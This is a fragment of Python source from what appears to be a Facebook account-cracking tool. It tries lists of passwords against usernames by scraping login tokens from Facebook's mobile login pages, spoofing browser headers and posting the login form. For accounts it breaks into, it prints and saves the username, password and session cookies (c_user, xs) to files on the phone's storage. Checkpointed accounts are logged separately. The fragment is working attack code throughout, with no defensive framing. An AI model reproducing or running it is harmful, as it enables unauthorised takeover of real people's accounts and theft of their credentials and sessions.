                    open('/sdcard/cil-CP.txt','a').write(kntl+'\n')
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(10)
            except Exception as e:
                pass
        self.loop+=1

    def asycn(self, username, pasw, kntd):
        sys.stdout.write(f'\r\r\033[1;37m [{H}Reguler{N}] %s|\033[1;32mLive:-%s \033[1;37m'%(self.loop,len(self.ok)));sys.stdout.flush()
        for password in pasw:
            try:
                ses=requests.Session()
                uas=uaku12()
                if "acy" in kntd:
                    urll = "https://m.alpha.facebook.com/login.php?"
                    heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": uas})
                    link = ses.get(urll, headers=heaq).text
                    data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1), "li": re.search('name="li" value="(.*?)"', str(link)).group(1), "try_number": 0, "unrecognized_tries": 0, "email": username, "prefill_contact_point": f"{username}", "prefill_source": "browser_dropdown", "prefill_type": "password", "first_prefill_source": "browser_dropdown", "first_prefill_type": "contact_point", "had_cp_prefilled": True, "had_password_prefilled": True, "is_smart_lock": False, "bi_xrwh": 0, "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{password}", "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(\d+)"', str(link)).group(1), "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(link)).group(1)}
                    post = "https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
                else:
                    if username.isdigit():
                        urll = "https://m.facebook.com/login/device-based/password/?uid={}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr".format(username)
                        heaq = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.facebook.com", "user-agent": uas})
                        link = ses.get(urll, headers=heaq).text
                        data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "uid": username, "next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified", "flow": "login_no_pin", "pass": password}
                        post = "https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID"

                cuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                head = ({"sec-fetch-site": "same-origin", "origin": "https://"+re.findall("https://(.*?)/", urll)[0], "accept": "*/*", "cookie": f"{cuki}", "content-type": "application/x-www-form-urlencoded", "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1), "referer": urll, "content-length": str(len((data))), "user-agent": uas})
                xnxx = ses.post(post, data=data, headers=head, allow_redirects=True)
                if "c_user" in ses.cookies.get_dict():
                    cooz = ses.cookies.get_dict()
                    coki = "datr=" + cooz["datr"] + ";" + ("sb=" + cooz["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + cooz["c_user"]) + ";" + ("xs=" + cooz["xs"]) + ";" + ("fr=" + cooz["fr"]) + ";"
                    print('\r\r\033[1;32m [OK] '+username+' | '+password+' | '+coki+'\033[1;97m')
                    kntl = (f"[✓] {username}|{password}")
                    self.ok.append(kntl)
                    open('/sdcard/cil-OK.txt','a').write(kntl+'\n')
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    print(f'\r\r{M} [CP] '+username+' | '+password+'\033[1;97m')
                    kntl = (f"[×] {username}|{password}")
                    self.cp.append(kntl)
                    open('/sdcard/cil-CP.txt','a').write(kntl+'\n')
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                time.sleep(5)
            except Exception as e:
                pass
        self.loop+=1

ACL()
